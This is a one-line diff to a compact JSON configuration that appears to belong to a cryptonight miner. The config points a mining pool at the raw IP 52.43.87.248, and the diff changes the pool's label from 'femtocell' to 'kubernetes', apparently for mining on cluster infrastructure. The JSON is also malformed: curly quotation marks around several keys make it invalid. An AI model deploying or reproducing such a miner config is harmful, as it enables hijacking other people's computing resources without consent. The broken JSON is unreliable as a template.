@@ -1,1 +1,1 @@
-{"av":1,"bg":false,"co":true,"cpa":null,"cpp”:5,”dl”:1,”lf":null,"mcu":100,"pt":0,"rr":5,"al":"cryptonight","rp":5,"sf":false,"sl":false,"th":null,"pools":[{"id":"52.43.87.248","idx":"femtocell","ka":true,"nh":true}]}
+{"av":1,"bg":false,"co":true,"cpa":null,"cpp”:5,”dl”:1,”lf":null,"mcu":100,"pt":0,"rr":5,"al":"cryptonight","rp":5,"sf":false,"sl":false,"th":null,"pools":[{"id":"52.43.87.248","idx":"kubernetes","ka":true,"nh":true}]}
